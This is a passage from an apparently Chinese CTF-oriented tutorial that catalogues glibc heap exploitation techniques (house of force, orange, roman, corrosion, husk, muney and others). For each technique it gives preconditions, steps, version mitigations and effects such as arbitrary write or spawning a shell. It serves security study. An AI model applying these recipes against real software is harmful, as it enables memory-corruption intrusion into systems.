overlapping</code>。</p><ul><li>申请 <code>chunk A、chunk B、chunk C、chunk D</code>，<code>chunk D</code> 用来做 <code>gap</code>，<code>chunk A、chunk C</code> 都要处于 <code>unsortedbin</code> 范围</li><li>释放 <code>A</code>，进入 <code>unsortedbin</code></li><li>对 <code>B</code> 写操作的时候存在 <code>off by null</code>，修改了 <code>C</code> 的 <code>P</code> 位</li><li>释放 <code>C</code> 的时候，堆后向合并，直接把 <code>A、B、C</code> 三块内存合并为了一个 <code>chunk</code>，并放到了 <code>unsortedbin</code> 里面</li><li>读写合并后的大 <code>chunk</code> 可以操作 <code>chunk B</code> 的内容，<code>chunk B</code> 的头</li></ul><h3 id="相关技巧-1"><a href="#相关技巧-1" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>虽然该利用技巧至今仍可以利用，但是需要对 <code>unlink</code> 绕过的条件随着版本的增加有所变化。</p><p>最开始的 <code>unlink</code> 的代码是：</p><p>| <code>1 2 3 4 5 6 7 8 9 10</code> | <code>/* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) {                                            \    FD = P-&gt;fd;      \    BK = P-&gt;bk;      \    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \    else {      \ // .....      \      }      \ }</code> |<br>| ———————— | ———————————————————— |<br>|                          |                                                              |</p><p>只需要绕过<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> 即可，因此，不需要伪造地址处于高位的 <code>chunk</code> 的 <code>presize</code> 域。</p><p>高版本的 <code>unlink</code> 的条件是：</p><p>新增了 <code>chunksize (p) != prev_size (next_chunk (p))</code>，对 <code>chunksize</code> 有了检查，伪造的时候需要绕过。</p><h3 id="利用效果-1"><a href="#利用效果-1" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>构造 <code>chunk overlap</code> 后，可以任意地址分配</li><li>结合其他方法进行任意地址读写</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="2016-seccon-tinypad"><a href="#2016-seccon-tinypad" class="headerlink" title="2016_seccon_tinypad"></a>2016_seccon_tinypad</h3><h2 id="2-3-house-of-force"><a href="#2-3-house-of-force" class="headerlink" title="2.3-house of force"></a>2.3-house of force</h2><h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写 <code>top_chunk</code></p><h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.29</code></li><li>可分配任意大小的 <code>chunk</code></li><li>需要泄露或已知地址</li></ul><h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>对 <code>top_chunk</code> 的利用，过程如下：</p><ul><li>申请 <code>chunk A</code></li><li>写 <code>A</code> 的时候溢出，修改 <code>top_chunk</code> 的 <code>size</code> 为很大的数</li><li>分配很大的 <code>chunk</code> 到任意已知地址</li></ul><h3 id="相关技巧-2"><a href="#相关技巧-2" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>注意，在 <code>glibc-2.29</code> 后加入了检测，<code>house of force</code> 基本失效：</p><p class='item-img' data-src='https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230303194137930.png'><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230303194137930.png" alt="image-20230303194137930"></p><h3 id="利用效果-2"><a href="#利用效果-2" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="2-4-house-of-lore"><a href="#2-4-house-of-lore" class="headerlink" title="2.4-house of lore"></a>2.4-house of lore</h2><h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>需要泄露或已知地址</li></ul><h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><p>控制 <code>smallbin</code> 的 <code>bk</code> 指针，示例如下：</p><ul><li>申请 <code>chunk A、chunk B、chunk C</code>，其中 <code>chunk B</code> 大小位于 <code>smallbin</code></li><li>释放 <code>B</code>，申请更大的 <code>chunk D</code>，使得 <code>B</code> 进入 <code>smallbin</code></li><li>写 <code>A</code>，溢出修改 <code>B</code> 的 <code>bk</code>，指向地址 <code>X</code>，这里有 <code>fake chunk</code></li><li>布置 <code>X-&gt;fd == &amp;B</code></li><li>分配两次后即可取出位于 <code>X</code> 地址处的 <code>fake chunk</code></li></ul><h3 id="相关技巧-3"><a href="#相关技巧-3" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>在引入了 <code>tcache stash unlink</code> 的时候，需要注意绕过：</p><p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p><p>实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 <code>fastbin/tcachebin</code>。</p><h3 id="利用效果-3"><a href="#利用效果-3" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="2-5-house-of-orange"><a href="#2-5-house-of-orange" class="headerlink" title="2.5-house of orange"></a>2.5-house of orange</h2><h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p><h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.26</code></li><li>没有 <code>free</code></li><li>可以 <code>unsortedbin attack</code></li></ul><h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of orange</code> 可以说是开启了堆与 <code>IO</code> 组合利用的先河，是非常经典、漂亮、精彩的利用组合技。利用过程还要结合 <code>top_chunk</code> 的性质，利用过程如下：</p><p><strong>stage1</strong></p><ul><li>申请 <code>chunk A</code>，假设此时的 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xWXYZ</code></li><li>写 <code>A</code>，溢出修改 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xXYZ</code>（需要满足页对齐的检测条件）</li><li>申请一个大于 <code>0xXYZ</code> 大小的 <code>chunk</code>，此时 <code>top_chunk</code> 会进行 <code>grow</code>，并将原来的 <code>old top_chunk</code> 释放进入 <code>unsortedbin</code></li></ul><p><strong>stage2</strong></p><ul><li>溢出写 <code>A</code>，修改处于 <code>unsortedbin</code> 中的 <code>old top_chunk</code>，修改其 <code>size</code> 为 <code>0x61</code>，其 <code>bk</code> 为 <code>&amp;_IO_list_all-0x10</code>，同时伪造好 <code>IO_FILE</code> 结构</li><li>申请非 <code>0x60</code> 大小的 <code>chunk</code> 的时候，首先触发 <code>unsortedbin attack</code>，将<code>_IO_list_all</code> 修改为 <code>main_arena+88</code>，然后 <code>unsortedbin chunk</code> 会进入到 <code>smallbin</code>，大小为 <code>0x60</code>；接着遍历 <code>unsortedbin</code> 的时候触发了 <code>malloc_printerr</code>，然后调用链为：<code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code>，调用到伪造的 <code>vtable</code> 里面的函数指针</li></ul><h3 id="相关技巧-4"><a href="#相关技巧-4" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>在 <code>glibc-2.24</code> 后加入了 <code>vtable</code> 的 <code>check</code>，不能任意地址伪造 <code>vatble</code> 了，但是可以利用 <code>IO_str_jumps</code> 结构进行利用。</li><li>在 <code>glibc-2.26</code> 后，<code>malloc_printerr</code> 不再刷新 <code>IO</code> 流了，所以该方法失效</li><li>由于<code>_mode</code> 的正负性是随机的，影响判断条件，大概有 <code>1/2</code> 的概率会利用失败，多试几次就好</li></ul><h3 id="利用效果-4"><a href="#利用效果-4" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li><li>任意命令执行</li></ul><h2 id="2-6-house-of-rabbit"><a href="#2-6-house-of-rabbit" class="headerlink" title="2.6-house of rabbit"></a>2.6-house of rabbit</h2><h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.26</code></li><li>超过 <code>0x400</code> 大小的堆分配</li><li>可以写 <code>fastbin</code> 的 <code>fd</code> 或者 <code>size</code> 域</li></ul><h3 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h3><p>该利用技巧的核心是 <code>malloc_consolidate</code> 函数，当检测到有 <code>fastbin</code> 的时候，会取出每一个 <code>fastbin chunk</code>，将其放置到 <code>unsortedbin</code> 中，并进行合并。以修改 <code>fd</code> 为例，利用过程如下：</p><ul><li>申请 <code>chunk A</code>、<code>chunk B</code>，其中 <code>chunk A</code> 的大小位于 <code>fastbin</code> 范围</li><li>释放 <code>chunk A</code>，使其进入到 <code>fastbin</code></li><li>利用 <code>use after free</code>，修改 <code>A-&gt;fd</code> 指向地址 <code>X</code>，需要伪造好 <code>fake chunk</code>，使其不执行 <code>unlink</code> 或者绕过 <code>unlink</code></li><li>分配足够大的 <code>chunk</code>，或者释放 <code>0x10000</code> 以上的 <code>chunk</code>，只要能触发 <code>malloc_consolidate</code> 即可</li><li>此时 <code>fake chunk</code> 被放到了 <code>unsortedbin</code>，或者进入到对应的 <code>smallbin/largebin</code></li><li>取出 <code>fake chunk</code> 进行读写即可</li></ul><h3 id="相关技巧-5"><a href="#相关技巧-5" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><code>2.26</code> 加入了 <code>unlink</code> 对 <code>presize</code> 的检查</li><li><code>2.27</code> 加入了 <code>fastbin</code> 的检查</li></ul><p>抓住重点：<code>house of rabbit</code> 是对 <code>malloc_consolidate</code> 的利用。因此，不一定要按照原作者的思路来，他的思路需要满足的条件太多了。</p><h3 id="利用效果-5"><a href="#利用效果-5" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="2-7-house-of-roman"><a href="#2-7-house-of-roman" class="headerlink" title="2.7-house of roman"></a>2.7-house of roman</h2><h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>use after free</code>、堆溢出</p><h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.29</code></li><li>可以 <code>use after edit</code></li><li>不需要泄露地址</li><li>需要爆破 <code>12 bit</code>，成功的概率 <code>1/4096</code></li></ul><h3 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h3><p>可以说这个技巧是 <code>fastbin attack + unsortedbin attack</code> 的组合技，利用思路如下：</p><ul><li>申请 <code>chunk A</code>、<code>chunk B</code>、<code>chunk C</code> 和 <code>chunk D</code>，<code>chunk B</code> 的大小为 <code>0x70</code></li><li>释放 <code>chunk B</code>，使其进入到 <code>fastbin[0x70]</code></li><li>溢出写 <code>A</code>，修改 <code>chunk B</code> 的 <code>size</code>，使其大小在 <code>unsortedbin</code> 范围</li><li>再次释放 <code>B</code>，<code>B</code> 进入 <code>unsortedbin</code> 中</li><li>部分写 <code>B</code> 的 <code>fd</code>，使得 <code>fd</code> 指向 <code>malloc_hook-0x23</code></li><li>利用 <code>A</code> 的溢出写修正 <code>B</code> 的 <code>size</code>，连续分配两次 <code>0x70</code>，即可分配到 <code>malloc_hook</code> 上方</li><li>触发 <code>unsortedbin attack</code>，将<code>__malloc_hook</code> 写为 <code>main_arena+88</code></li><li>部分写<code>__malloc_hook</code> 的低三个字节，修改为 <code>one_gadget</code></li><li>再次 <code>malloc</code> 即可拿到 <code>shell</code></li></ul><h3 id="相关技巧-6"><a href="#相关技巧-6" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>使用 <code>house of roman</code> 的时候，需要采用多线程爆破</li><li>可以使用其他方法代替，比如先攻击 <code>stdout</code> 泄露地址，使得爆破的成本降低</li></ul><h3 id="利用效果-6"><a href="#利用效果-6" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>执行 <code>one_gadget</code></li><li>绕过 <code>ASLR</code></li></ul><h2 id="2-8-house-of-storm"><a href="#2-8-house-of-storm" class="headerlink" title="2.8-house of storm"></a>2.8-house of storm</h2><h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.29</code></li><li>可以进行 <code>unsortedbin attack</code></li><li>可以进行 <code>largebin attack</code>，修改 <code>bk</code> 和 <code>bk_nextsize</code></li><li>可以分配 <code>0x50</code> 大小的 <code>chunk</code></li></ul><h3 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of storm</code> 也是一款组合技，利用开启了 <code>PIE</code> 的 <code>x64</code> 程序的堆地址总是 <code>0x55xxxx...</code> 或者 <code>0x56xxxx...</code> 开头这一特性，使用一次 <code>largebin attack</code> 写两个堆地址，使用一次 <code>unsortedbin attack</code> 写一次 <code>libc</code> 地址，可以实现任意地址分配。虽然 <code>house of storm</code> 最后能达到任意地址分配，但是由于其所需的条件比较多，一般可以用其他更简便的堆利用技术代替。利用思路如下：</p><ul><li>进行一次 <code>unsortedbin attack</code>，其 <code>bk</code> 修改为 <code>addr</code></li><li>进行一次 <code>largebin attack</code>，其 <code>bk</code> 修改为 <code>addr+0x10</code>，<code>bk_nextsize</code> 修改为 <code>addr-0x20+3</code></li><li>申请 <code>0x50</code> 大小的 <code>chunk</code> 即可申请到 <code>addr</code> 处</li></ul><h3 id="相关技巧-7"><a href="#相关技巧-7" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>需要注意的有：</p><ul><li>该方法成功的几率是 <code>50%</code>，因为 <code>0x55</code> 会触发 <code>assert</code> 断言，<code>0x56</code> 才能成功</li><li>申请 <code>addr</code> 处的 <code>chunk</code> 的时候需要从 <code>unsortedbin</code> 里面取</li></ul><h3 id="利用效果-7"><a href="#利用效果-7" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li></ul><h2 id="2-9-house-of-corrosion"><a href="#2-9-house-of-corrosion" class="headerlink" title="2.9-house of corrosion"></a>2.9-house of corrosion</h2><h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code></p><h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>任意大小分配</li><li>可以修改 <code>global_max_fast</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h3><p>一个非常 <code>tricky</code> 的方法，可以绕过 <code>aslr</code>，不需要泄露地址都能达成 <code>rce</code>，可以很很多方法结合起来应用。先说利用原理：</p><ul><li>使用 <code>unsortedbin attack/largebin attack</code> 等方法，成功修改 <code>global_max_fast</code> 的值为很大的值。如果使用 <code>unsortedbin attack</code>，不需要泄露地址，爆破 <code>1/16</code> 即可</li><li>申请任意大小的 <code>chunk</code>，这些 <code>chunk</code> 都会被视为 <code>fastbin chunk</code>，然后利用这些 <code>chunk</code> 来进行读和写</li></ul><p>此时的计算公式为：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chunk</span> size = (chunk addr - &amp;main_arena.fastbinsY) x <span class="hljs-number">2</span> + <span class="hljs-number">0</span>x20<br></code></pre></td></tr></tbody></table></figure><p>读原语：</p><ul><li>假设对应的地址 <code>X</code> 上存储着 <code>Y</code>，现在的目的是泄露出 <code>Y</code></li><li>根据偏移计算出来 <code>chunk size</code>，修改 <code>chunk A</code> 的 <code>size</code> 为计算出来的值，释放 <code>chunk A</code> 到地址 <code>X</code> 处</li><li>此时，<code>A-&gt;fd</code> 就被写入了 <code>Y</code></li><li>通过打印即可泄露出 <code>Y</code> 的信息</li></ul><p>写原语 <code>1</code>：</p><ul><li>假设对应的地址 <code>X</code> 上存储着 <code>Y</code>，现在的目的是修改地址 <code>X</code> 存储的 <code>Y</code> 为其他值</li><li>根据偏移计算出来 <code>chunk size</code>，修改 <code>chunk A</code> 的 <code>size</code> 为计算出来的值，释放 <code>chunk A</code> 到地址 <code>X</code> 处</li><li>此时，<code>A-&gt;fd</code> 就被写入了 <code>Y</code></li><li>修改 <code>A-&gt;fd</code> 为目标值</li><li>分配一次 <code>chunk A</code> 就可以把地址 <code>X</code> 存储的值为任意值</li></ul><p>写原语 <code>2</code>：</p><ul><li>假设地址 <code>X</code> 上存储着 <code>Y</code>、地址 <code>M</code> 上存储着 <code>N</code>，现在的目的是把 <code>N</code> 写到地址 <code>X</code> 处</li><li>根据偏移计算 <code>chunk size1</code>，先释放 <code>chunk A</code> 到地址 <code>X</code> 处，此时有地址 <code>X</code> 处存储 <code>chunk A</code> 地址，<code>chunk A-&gt;fd</code> 为 <code>Y</code></li><li>根据偏移计算 <code>chunk size2</code>，再次释放 <code>chunk A</code> 到地址 <code>M</code> 处，此时有地址 <code>M</code> 处存储 <code>chunk A</code> 地址，<code>chunk A-&gt;fd</code> 为 <code>N</code></li><li>修正 <code>chunk A</code> 的大小为 <code>chunk size1</code>，分配 <code>1</code> 次 <code>chunk</code> 即可使得 <code>N</code> 转移到地址 <code>X</code> 处，当然在转移的过程中可以适当的修改 <code>N</code></li></ul><p>显然，借助写原语 <code>2</code>，即可在不需要泄露地址的前提下将<code>__malloc_hook</code> 等写为 <code>one_gadget</code>，爆破的概率是 <code>1/4096</code>。</p><h3 id="相关技巧-8"><a href="#相关技巧-8" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>虽然至今都能使用 <code>house of corrosion</code>，但是在 <code>glibc-2.37</code> 版本中，<code>global_max_fast</code> 的数据类型被修改为了 <code>int8_u</code>，进而导致可控的空间范围大幅度缩小。</li><li><code>house of corrosion</code> 也可以拓展到 <code>tcachebin</code> 上</li><li>适当控制 <code>global_max_fast</code> 的大小，把握控制的空间范围</li><li>可以和 <code>IO_FILE</code> 结合起来泄露信息</li></ul><h3 id="利用效果-8"><a href="#利用效果-8" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li><code>glibc</code> 上的地址泄露</li><li>执行 <code>one_gadget</code></li></ul><h2 id="2-10-house-of-husk"><a href="#2-10-house-of-husk" class="headerlink" title="2.10-house of husk"></a>2.10-house of husk</h2><h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以修改<code>__printf_arginfo_table</code> 和<code>__printf_function_table</code></li><li>可触发格式化字符串解析</li></ul><h3 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h3><p>严格来说，这个漏洞是与堆的关系并不是很大，主要是根据 <code>printf</code> 的机制进行利用。但是，该技术可以和很多堆利用手法结合起来。</p><p>调用处 <code>1</code>：</p><p>利用方式为：</p><ul><li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li><li>设占位符为 <code>α</code>，此时 <code>chunk B</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li></ul><p>调用处 <code>2</code>：</p><p>利用方式为：</p><ul><li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li><li>设占位符为 <code>α</code>，此时 <code>chunk A</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li></ul><p>该处调用在高版本被删除。</p><h3 id="相关技巧-9"><a href="#相关技巧-9" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>该技巧一般和 <code>largebin attack</code> 结合起来</li><li>在低于 <code>2.36</code> 版本中，<code>__malloc_assert</code> 中有格式化字符串的解析</li><li>还有一个<code>__printf_va_arg_table</code> 也是可以利用的，但是条件比较苛刻</li></ul><h3 id="利用效果-9"><a href="#利用效果-9" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>执行 <code>one_gadget</code></li><li>执行 <code>rop</code> 控制程序执行流</li></ul><h2 id="2-11-house-of-atum"><a href="#2-11-house-of-atum" class="headerlink" title="2.11-house of atum"></a>2.11-house of atum</h2><h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">edit</span> after free<br></code></pre></td></tr></tbody></table></figure><h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——<code>2.30</code></li><li>可以修改 <code>tcachebin</code> 的 <code>next</code> 和 <code>key</code></li></ul><h3 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h3><p>这是一个关于 <code>tcachebin</code> 的技巧，用于修改 <code>chunk presize/size</code>，利用过程如下：</p><ul><li>申请 <code>chunk A</code>，大小在 <code>fastbin</code> 范围内</li><li>释放 <code>A</code>，连续释放 <code>8</code> 次，此时，<code>A</code> 的 <code>fd</code> 被清 <code>0</code>，<code>A</code> 也被放置到了 <code>fastbin</code> 里面</li><li>申请一个 <code>chunk</code>，将其 <code>fd</code> 修改为 <code>A - 0x10</code>，此时 <code>tcache</code> 中的 <code>counts</code> 为 <code>6</code></li><li>再申请一个 <code>chunk</code>，从 <code>fastbin</code> 里面取，但是会把 <code>fastbin</code> 里面剩余的一个 <code>chunk</code> 链入到 <code>tcachebin</code></li><li>再次分配就会分配到地址 <code>A-0x10</code> 处，就可以修改原来 <code>A</code> 的 <code>presize/size</code> 等</li></ul><h3 id="相关技巧-10"><a href="#相关技巧-10" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><code>2.30</code> 之后逻辑变了，原来是判断 <code>entry[idx]!=NULL</code>，<code>2.31</code> 之后判断 <code>count[idx] &gt; 0</code></li><li>有时候需要绕过 <code>tcache-&gt;key</code> 的检测</li></ul><h3 id="利用效果-10"><a href="#利用效果-10" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>修改 <code>chunk size</code> 以及 <code>chunk presize</code></li></ul><h2 id="2-12-house-of-kauri"><a href="#2-12-house-of-kauri" class="headerlink" title="2.12-house of kauri"></a>2.12-house of kauri</h2><h3 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——<code>2.32</code></li></ul><h3 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用原理很简单，修改 <code>tcachebin</code> 的 <code>size</code>，然后使其被放到不同大小的 <code>tcachebin</code> 链表里面去。我感觉这个技巧是很基础的 <code>tcachebin</code> 技巧，甚至不应该被称之为 <code>house of</code>。</p><h3 id="相关技巧-11"><a href="#相关技巧-11" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>无</li></ul><h3 id="利用效果-11"><a href="#利用效果-11" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>多个 <code>tcachebin</code> 链表中存放同一个 <code>chunk</code></li></ul><h2 id="2-13-house-of-fun"><a href="#2-13-house-of-fun" class="headerlink" title="2.13-house of fun"></a>2.13-house of fun</h2><h3 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code></p><h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.30</code></li><li>可以申请 <code>largebin</code> 范围的 <code>chunk</code></li></ul><h3 id="利用原理-12"><a href="#利用原理-12" class="headerlink" title="利用原理"></a>利用原理</h3><p>或许这个技巧应该叫做 <code>largebin attack</code>。</p><p>在这个 <a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hp=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=5b06f538c5aee0389ed034f60d90a8884d6d54de;hpb=a0a0dc83173ce11ff45105fd32e5d14356cdfb9c">sourceware.org Git - glibc.git/blobdiff - malloc/malloc.c</a><code>commit</code> 被检测了：</p><p class='item-img' data-src='https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230306115614058.png'><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230306115614058.png" alt="image-20230306115614058"></p><h3 id="相关技巧-12"><a href="#相关技巧-12" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>无</li></ul><h3 id="利用效果-12"><a href="#利用效果-12" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址写堆地址</li></ul><h2 id="2-14-house-of-mind"><a href="#2-14-house-of-mind" class="headerlink" title="2.14-house of mind"></a>2.14-house of mind</h2><h3 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以分配任意大小的 <code>chunk</code></li></ul><h3 id="利用原理-13"><a href="#利用原理-13" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要利用的是：</p><table><thead><tr><th><code>1 2 3 4 </code></th><th><code>#define heap_for_ptr(ptr) \  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1))) #define arena_for_chunk(ptr) \  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>如果是 <code>non-mainarean</code> 的 <code>chunk</code>，会根据其地址找到 <code>heapinfo</code>，然后找到 <code>malloc_state</code> 结构体。</p><p>因此，利用技巧是：</p><ul><li>根据要释放的 <code>fastbin chunk A</code> 的堆地址，找到对应的 <code>heap_for_ptr</code> 地址</li><li>在 <code>heapinfo</code> 地址处伪造好相关变量，重点是 <code>mstate</code> 指针</li><li>修改 <code>chunk A</code> 的 <code>non-main</code> 标志位，释放到伪造的 <code>arena</code> 里面，控制好偏移即可</li></ul><h3 id="相关技巧-13"><a href="#相关技巧-13" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>一般来说，可以分配任意大小的 <code>chunk</code>，还能堆溢出，很多技巧都能用</li><li>这个技巧是希望大家关注对于 <code>arena</code> 的攻击</li><li>甚至可以直接修改 <code>thread_arena</code> 这个变量</li></ul><h3 id="利用效果-13"><a href="#利用效果-13" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址写堆地址</li></ul><h2 id="2-15-house-of-muney"><a href="#2-15-house-of-muney" class="headerlink" title="2.15-house of muney"></a>2.15-house of muney</h2><h3 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-14"><a href="#适用范围-14" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>能分配 <code>mmap</code> 的 <code>chunk</code></li><li>能修改 <code>mmap</code> 的 <code>chunk</code> 的大小</li></ul><h3 id="利用原理-14"><a href="#利用原理-14" class="headerlink" title="利用原理"></a>利用原理</h3><p>这个技巧被称之为 <code>steal heap from glibc</code>。主要的点有以下几个：</p><ul><li><code>libc.so.6</code> 映射的地址空间，前面都是与符号表、哈希表、字符串表等重定位或者解析函数地址有关，前面一段的权限是 <code>r--</code></li><li><code>mmap(NULL, ...)</code> 是会分配到 <code>libc.so.6</code> 的上方的</li></ul><p>基于这两个知识点，利用过程如下：</p><ul><li>申请 <code>chunk A</code>，假设为 <code>0x40000</code> 大小，则会走 <code>mmap</code> 申请，并且申请到 <code>libc.so.6</code> 的上方</li><li>修改 <code>chunk A</code> 的大小为 <code>0x45000</code>，设置 <code>MMAP</code> 标志位</li><li>释放 <code>chunk A</code>，则会把 <code>libc.so.6</code> 的 <code>0x5000</code> 的内存也释放掉</li><li>再次申请 <code>0x45000</code>，就可以控制 <code>libc.so.6</code> 原来的符号表、哈希表等等</li><li>触发一次 <code>dl_runtime_resolve</code> 等就能控制程序执行任意代码</li></ul><h3 id="相关技巧-14"><a href="#相关技巧-14" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>需要伪造的符号表、哈希表等需要逐步调试</li><li>可以扩展为 <code>steal heap from everywhere</code></li></ul><h3 id="利用效果-14"><a href="#利用效果-14" 